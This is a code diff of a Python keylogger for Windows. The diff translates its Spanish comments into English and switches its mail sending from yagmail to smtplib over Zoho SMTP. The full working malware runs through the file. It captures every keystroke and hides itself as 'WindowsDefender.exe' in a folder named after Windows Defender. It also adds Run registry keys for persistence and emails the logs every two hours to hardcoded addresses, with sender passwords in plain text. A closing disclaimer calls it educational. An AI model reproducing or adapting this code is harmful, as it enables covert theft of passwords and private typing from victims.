@@ -12,6 +12,7 @@
 #░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.2
 
 # Librerías Utilizadas
+import smtplib
 from pynput.keyboard import Key, Listener
 import pynput
 from getpass import getuser # Obtiene el nombre del usuario
@@ -21,13 +22,13 @@ import os
 import yagmail
 import shutil
 from winreg import *
-# Librería verifica internet 
+# Library checks internet
 import socket
 import time
-import threading # Hilos
+import threading # Threads
 
-# Convierte tecla a un valor legible
-def KeyConMin(argument):                # Caracteres Comunes // Optimizados
+# Convert key to a readable value
+def KeyConMin(argument):                # Common Characters // Optimized
     switcher = {
         # Vocales Minisculas
         "'a'": "a",
@@ -35,7 +36,7 @@ def KeyConMin(argument):                # Caracteres Comunes // Optimizados
         "'i'": "i",
         "'o'": "o",
         "'u'": "u",
-        # Letras  Minusculas
+        # Small Letters
         "'b'": "b",
         "'c'": "c",
         "'d'": "d",
@@ -59,19 +60,19 @@ def KeyConMin(argument):                # Caracteres Comunes // Optimizados
         "'x'": "x",
         "'y'": "y",
         "'z'": "z",
-        # Caracteres
+        # Characters
         "','": ",",                     # ,
         "'.'": ".",                     # .
         "'_'": "_",                     # _
         "'-'": "-",                     # -
         "':'": ":",                     #
-        # Vocales Mayúsculas
+        # Uppercase Vowels
         "'A'": "A",
         "'E'": "E",
         "'I'": "I",
         "'O'": "O",
         "'U'": "U",
-        # Letras Mayúsculas
+        # Capital letters
         "'B'": "B",
         "'C'": "C",
         "'D'": "D",
@@ -93,7 +94,7 @@ def KeyConMin(argument):                # Caracteres Comunes // Optimizados
         "'X'": "X",
         "'Y'": "Y",
         "'Z'": "Z",
-        # Números Standard
+        # Standard Numbers
         "'1'": "1",
         "'2'": "2",
         "'3'": "3",
@@ -104,7 +105,7 @@ def KeyConMin(argument):                # Caracteres Comunes // Optimizados
         "'8'": "8",
         "'9'": "9",
         "'0'": "0",
-        # Caracteres Especiales
+        # Special Characters
         "'@'": "@",                     # @
         "'#'": "#",                     # #
         "'*'": "*",                     #
@@ -133,15 +134,15 @@ def KeyConMin(argument):                # Caracteres Comunes // Optimizados
     }
     return switcher.get(argument, "")
 
-# Convierte tecla a un valor legible
-def KeyConMax(argument):                # Botones, comunes // Optimizados
+# Convert key to a readable value
+def KeyConMax(argument):                # Buttons, common // Optimized
     switcher = {
-        "Key.space": " ",               # Espacio
-        "Key.backspace": "«",           # Borrar
-        "Key.enter": "\r\n",            # Salto de linea
-        "Key.tab": "    ",              # Tabulación
-        "Key.delete":" «×» ",           # Suprimir
-        # Números
+        "Key.space": " ",               # Space
+        "Key.backspace": "«",           # Backspace
+        "Key.enter": "\r\n",            # Line break
+        "Key.tab": "    ",              # Tab
+        "Key.delete":" «×» ",           # Delete
+        # Numbers
         "<96>": "0",                 # 0
         "<97>": "1",                 # 1
         "<98>": "2",                 # 2
@@ -152,7 +153,7 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
         "<103>": "7",                # 7
         "<104>": "8",                # 8
         "<105>": "9",                # 9
-        # Números Númeral
+        # Decimal numbers
         "None<96>": "0",                 # 0
         "None<97>": "1",                 # 1
         "None<98>": "2",                 # 2
@@ -163,7 +164,7 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
         "None<103>": "7",                # 7
         "None<104>": "8",                # 8
         "None<105>": "9",                # 9
-        # Teclas raras 2 
+        # Strange letters 2 
         "['^']": "^",
         "['`']": "`",                     #
         "['¨']": "¨",                     #
@@ -191,7 +192,7 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
     }
     return switcher.get(argument, "")
 
-# Obtiene registro de teclas y guarda en un archivo log.txt
+# Get keylogging and save to a log.txt file
 def Klogger():
     try:        # Intenta crear el archivo
         log = os.environ.get(
@@ -204,8 +205,8 @@ def Klogger():
 
         with open (log, "a") as f:
             f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
-    except: # Si no puede crear el archivo, crea el directorio faltante
-        CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+    except: # If it can't create the file, create the missing directory
+        CreateDir()  # Function: Create the directory ==> C:\Users\Public\Security\Windows Defender
     
     def on_press(key):
         with open(log, "a") as f:
@@ -217,143 +218,171 @@ def Klogger():
                 #print("[KeyConMax]")
                 print(KeyConMax(str(key)))
                 f.write(KeyConMax(str(key)))
-    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
+    with Listener(on_press=on_press) as listener:  # Listen for keystrokes
         listener.join() 
 
-# Envía los datos log.txt vía Gmail 
+
+
 def sendEmail(log, sender_email, sender_password, receiver_email):
+    print("SendEmail function start")
     try:
+        s = smtplib.SMTP('smtp.zoho.com', 587)
+        s.starttls()
+        s.login(sender_email, sender_password)
+        
         mifecha                 = datetime.datetime.now()
         subject                 = "Data User: "+ str(getuser()) 
-        # Inicia Sesión 
-        yag = yagmail.SMTP(user=sender_email, password=sender_password)
-        informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
+        information = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
         # Cuerpo del mensaje
         contents = [ 
-            "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
+                "Information:\n\nUserName: "+ str(getuser()) + information
         ]
-        yag.send(receiver_email, subject, contents, attachments=log )
-        print("[+] Se envió el correo correctamente")
-        return True;
+        # yag.send(receiver_email, subject, contents, attachments=log )
+        # print("[+] Email sent successfully")
+        s.sendmail(sender_email, receiver_email, contents)
+        print("[+] The mail was sent successfully")
+        s.quit()
+        return True
     except:
-        print("[-] No se pudo envíar el correo")
+        print("[-] The mail could not be sent")
         return False
 
-# Renombre el archivo log, antes de ser envíado
+
+# Send the log.txt data via Email
+# def sendEmail(log, sender_email, sender_password, receiver_email):
+#     try:
+#         mifecha                 = datetime.datetime.now()
+#         subject                 = "Data User: "+ str(getuser()) 
+#         # Login Session
+#         yag = yagmail.SMTP(user=sender_email, password=sender_password)
+#         informacion = "\nDate: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" seconds"
+#         # Cuerpo del mensaje
+#         contents = [ 
+#             "Information:\n\nUsername: "+ str(getuser()) + informacion
+#         ]
+#         yag.send(receiver_email, subject, contents, attachments=log )
+#         print("[+] The mail was sent successfully")
+
+#         return True;
+#     except:
+#         print("[-] The mail could not be sent")
+#         return False
+
+# Rename the log file, before it is sent
 def Rename(name):
     try:
-        CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-        # Copia el archivo 
+        CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
+        # Copy the file
         pathO = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
         pathN= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
         os.rename(pathO, pathN)
     except:
         pass
 
-# Función = Verifica si hay conexión a internet para poder envíar el log
+# Function = Check if there is internet connection to be able to send the log
 def VerificarConexion():
-    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
-    try:                                                            # Intenta conectarse al servidor de Google
+    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # We create the connection socket
+    try:                                                            # Try to connect to Google server
         con.connect(('www.google.com', 80))
         con.close()
         return True
     except:
         return False
 
-# Crea el directorio oculto 
+# Create the hidden directory
 def CreateDir():
-    try:  # Intenta crear la dirección
+    try: # Try to create the address
         os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
     except :
         pass
 
-# Cópia él Keylogger a la carpeta oculta 
+# Copy the Keylogger to the hidden folder
 def EscondeKey():
-    CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+    CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
     nameKey = "WindowsDefender.exe"
     filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
 
     try:
-        with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
-            print("El keylogger ya se encuentra en la carpeta oculta")
+        with open(filePath, 'r') as f:      # Check if the keylogger is hidden in the system
+            print("The keylogger is already in the hidden folder")
     except :
-        print("El Keylogger no se encuentra en el sistema, y tratará de copiarlo")
+        print("The Keylogger is not found in the system, and will try to copy it")
         try:
-            shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
-            print("El keylogger se escondió exitosamente en el sistema")
+            shutil.copy(nameKey , filePath) # Try to hide the keylogger in a folder
+            print("The keylogger successfully hide itself in the system")
         except:
-            print("No se puedo esconder el Keylogger en el sistema")
+            print("Can't hide the Keylogger in the system")
 
-# Intervalo de tiempo que se enviará el archivo log.txt
+# Time interval the log.txt file will be sent
 def SendLog():
-    n = 1   # Para renombre los archivos
+    n = 1   # To rename the files
     while (True):
         n = n+1
 
-        # Correo de envío [Principal]      <=> Se enviará 
-        sender_email_P       = "eneboltest@zohomail.com"   # <<== Cambia éste correo
-        sender_password_P    = "Y6dvxnd@"          # <<== Contraseña del correo 
+        # shipping mail [Principal]      <=> It will be sent
+        sender_email_P       = "eneboltest@zohomail.com"   # <<== change this email
+        sender_password_P    = "Y6dvxnd@"          # <<== email password 
 
-        # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-        sender_email_S       = "eneboltest2022@gmail.com"   # <<== Cambia éste correo
-        sender_password_S    = "Y6dvxnd@"          # <<== Contraseña del correo 
+        # shipping mail [Secondary]     <=> Only if there is any shipping problem with the main mail
+        sender_email_S       = "eneboltest2022@gmail.com"   # <<== change this email
+        sender_password_S    = "Y6dvxnd@"          # <<== email password 
 
-        # Correo o correos que recibirán el registro de datos `log.txt`
-        receiver_email   = ["eneboltest@zohomail.com","mytestemail212121@gmail.com"] # MultiCorreo
-      # receiver_email   = ["correo@gmail.com"]  # SingleCorreo
+        # Email or emails that will receive the data record `log.txt`
+        receiver_email   = ["eneboltest@zohomail.com","mytestemail212121@gmail.com"] # MultiEmail
+      # receiver_email   = ["correo@gmail.com"]  # SingleEmail
 
-        # Enviar cada 2 horas aprox
+        # Send every 2 hours approx
         for x in range(720):    #720
             time.sleep(10) # *10 
-            #print("Pasó: "+ str(x*10))
+            #print("Pass: "+ str(x*10))
 
-        if VerificarConexion(): # Continua solo si hay conexión
-            # Crea nombre del archivo
+        if VerificarConexion(): # Continue only if there is a connection
+            # Create file name
             nameFile = "log"+str(n)
-            #Renombra el archivo original
-            Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`
+            #Rename the original file
+            Rename(nameFile)    # Change the file `log.txt` a  `log2.txt`
 
-            #Envía el archivo renombrado
-            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+            #Send the renamed file
+            CreateDir()  # Create the directory ==> C:\Users\Public\Security\Windows Defender
             homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
             print("Proceso de envío")
 
-            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Envía con el primer correo
-                #Si se envíó correctamente, pues elimina el archivo
+            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Send with first email
+                #If it was sent correctly, then delete the file
                 os.remove(homedir)
-            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):  # Envía con el segundo correo 
+            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):  # Send with the second email 
                 os.remove(homedir)
-        else:   # No hay conexión
-            # Seguirá sobreescribiendo el archivo
-            # No hará nada, y esperará que aya una conexión exitosa
+        else:   # no connection
+             # Will keep overwriting the file
+             # Will do nothing, and wait for a successful connection
             pass
         
-def addStartup():  # function =  Iniciar automaticamente
-    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe" # Path del Software completo
-    name = "Windows Defender"                                                       # Nombre del StartUp
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
+def addStartup():  # function =  auto start
+    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe" # Full Software Path
+    name = "Windows Defender"                                                       # Startup name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Registry path
     def verificar():
-        try:  # Intenta crear la dirección
+        try:  # Try to create the address
             os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
-            return True # Se creó la carpeta
+            return True # folder was created
         except:
-            return False# La carpeta ya existe
-    try:    # Solo si tiene permisos de administrador
+            return False# The folder already exists
+    try:    # Only if you have administrator permissions
         registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
         SetValueEx(registry,name, 0, REG_SZ, path)
-        verificar() # Crea Carpeta
-    except: # Si no tien permisos de administrador
+        verificar() # Create Folder
+    except: # If you don't have admin permissions
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
             SetValueEx(registry,name, 0, REG_SZ, path)
            
     
 
-# Inicio multihilo
+# multithread start
 if __name__ == '__main__':
     
-    EscondeKey()    # Se replica dentro de la computadora
-    addStartup()    # Modifica registro
+    EscondeKey()    # Replicates inside the computer
+    addStartup()    # Modify record
     p1 = threading.Thread(target=Klogger)
     p2 = threading.Thread(target=SendLog)
     p2.start()
@@ -365,9 +394,9 @@ if __name__ == '__main__':
 #                 Developed by SebastianEPH                     #
 #                                                   v.3.2       #
 #################################################################
-# Notas importantes
+# Important Notes
 #
-# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
+# *** This script was created for educational purposes only, for that detail the script is documented, I am not responsible for a possible misuse of this script***
 #
-# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python
+# Read the documentation at: https://github.com/SebastianEPH/Keylogger_Python
 
